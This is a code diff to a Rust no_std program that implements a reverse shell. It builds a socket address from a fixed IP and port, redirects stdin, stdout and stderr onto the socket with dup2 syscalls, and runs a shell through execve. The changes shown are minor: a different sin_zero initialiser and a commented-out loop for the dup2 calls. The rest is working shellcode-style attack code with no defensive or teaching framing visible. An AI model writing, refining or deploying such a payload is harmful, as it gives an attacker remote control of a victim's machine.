@@ -75,7 +75,7 @@ fn _start() -> ! {
         sin_family: AF_INET as u16,
         sin_port: PORT,
         sin_addr: in_addr { s_addr: IP },
-        sin_zero: Default::default(),
+        sin_zero: [0; 8],
     };
     let socket_addr_len = core::mem::size_of::<sockaddr_in>();
 
@@ -91,6 +91,10 @@ fn _start() -> ! {
         syscall2(SYS_DUP2, socket_fd, STDIN);
         syscall2(SYS_DUP2, socket_fd, STDOUT);
         syscall2(SYS_DUP2, socket_fd, STDERR);
+
+        // for i in 0..3 {
+        //     syscall2(SYS_DUP2, socket_fd, i);
+        // }
 
         syscall3(SYS_EXECVE, shell.as_ptr() as u64, argv.as_ptr() as u64, 0);
     };
